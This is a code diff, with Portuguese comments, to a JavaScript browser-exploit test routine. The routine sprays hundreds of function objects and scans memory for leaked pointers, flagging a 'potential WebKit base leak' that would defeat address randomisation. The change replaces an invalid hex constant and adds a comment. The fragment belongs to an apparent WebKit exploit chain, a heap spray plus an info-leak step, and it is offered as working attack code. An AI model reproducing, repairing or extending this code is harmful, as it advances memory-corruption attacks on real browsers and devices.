@@ -110,7 +110,9 @@ export async function sprayAndInvestigateObjectExposure() {
         logS3("PASSO 2: Pulverizando objetos JSFunction...", "info", FNAME_CURRENT_TEST);
         const NUM_SPRAY_FUNCTIONS = 300;
         for (let i = 0; i < NUM_SPRAY_FUNCTIONS; i++) {
-            sprayedObjects.push(function () { return i + 0xFUNCSPR; });
+            // CORREÇÃO: Substituído 0xFUNCSPR por um valor hexadecimal válido.
+            // Se 0xFUNCSPR tinha um significado específico, ajuste 0xF00DCAFE para o valor correto.
+            sprayedObjects.push(function () { return i + 0xF00DCAFE; });
         }
         logS3(`  ${sprayedObjects.length} JSFunctions pulverizadas.`, "info", FNAME_CURRENT_TEST);
         await PAUSE_S3(500);
@@ -150,7 +152,7 @@ export async function sprayAndInvestigateObjectExposure() {
 
                             if ((potential_base_addr.low() & 0xFFF) === 0 &&
                                 potential_base_addr.high() > 0x1000 &&
-                                potential_base_addr.high() < 0x7FFF0000) {
+                                potential_base_addr.high() < 0x7FFF0000) { // Ensure this upper bound is appropriate
 
                                 logS3(`    !!!! VAZAMENTO DE BASE DO WEBKIT POTENCIAL !!!!`, "vuln", FNAME_CURRENT_TEST);
                                 logS3(`      Ponteiro vazado (offset ${toHex(offset)}): ${potential_ptr_qword.toString(true)}`, "vuln", FNAME_CURRENT_TEST);
